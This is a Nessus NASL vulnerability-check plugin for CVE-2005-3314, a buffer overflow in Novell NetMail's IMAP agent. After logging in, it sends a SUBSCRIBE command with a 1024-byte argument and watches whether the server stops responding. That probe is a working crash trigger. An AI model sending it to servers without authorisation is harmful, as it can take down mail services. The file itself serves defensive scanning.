#
# (C) Tenable Network Security
#


if (description) {
  script_id(20318);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3314");
  script_bugtraq_id(15491);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"20956");
  }

  script_name(english:"Novell NetMail IMAP Agent Long Verb Arguments Buffer Overflow Vulnerability");
  script_summary(english:"Checks for long verb arguments buffer overflow vulnerability in Novell NetMail's IMAP agent");
 
  desc = "
Synopsis :

The remote IMAP server is affected by a buffer overflow vulnerability. 

Description :

The remote host is running Novell NetMail, a messaging and calendaring
system for Windows, Linux, Unix, and Netware. 

The IMAP agent installed on the remote host as part of Novell NetMail
is affected by a stack-based buffer overflow due to its improper
handling of long arguments to selected IMAP commands while in an
authenticated state.  Successful exploitation of this issue may lead
to the execution of arbitrary code on the remote host. 

See also :

http://www.zerodayinitiative.com/advisories/ZDI-05-003.html
http://support.novell.com/filefinder/19357/beta.html

Solution : 

Upgrade to NetMail 3.52E FTF (Field Test File) 1 or later. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "Gain root remotely";
  script_family(english:family["english"]);

  script_dependencie("imap_overflow.nasl");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("global_settings.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("imap/login and/or imap/password are empty; skipped!", level:0);
  exit(0);
}


# Try a couple of times to exploit the issue.
tries = 2;
for (iter=1; iter<=tries; iter++) {
  tag = 0;

  # Establish a connection.
  soc = open_sock_tcp(port);
  if (soc) {
    # Read banner and make sure it looks like NetMail.
    s = recv_line(socket:soc, length:1024);
    if (
      !strlen(s) || 
      "NetMail IMAP4 Agent" >!< s
    ) {
      close(soc);
      exit(0);
    }

    # Try to log in.
    ++tag;
    resp = NULL;
    c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }

    # If successful, try to exploit the flaw.
    if (resp && resp =~ "OK") {
      ++tag;
      resp = NULL;

      c = string("nessus", string(tag), " SUBSCRIBE ", crap(1024));
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
      }

      # If we got a response, the server's not vulnerable.
      if (strlen(resp)) {
        # Logout.
        ++tag;
        resp = NULL;
        c = string("nessus", string(tag), " LOGOUT");
        send(socket:soc, data:string(c, "\r\n"));
        while (s = recv_line(socket:soc, length:1024)) {
          s = chomp(s);
          m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
          if (!isnull(m)) {
            resp = m[1];
            break;
          }
        }
        close(soc);

        break;
      }
    }
    else if (resp =~ "NO") {
      if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
    }
  }
}


# There's a problem if our exploit worked every time.
if (iter > tries && c && "SUBSCRIBE" >< c) {
  security_warning(port);
}
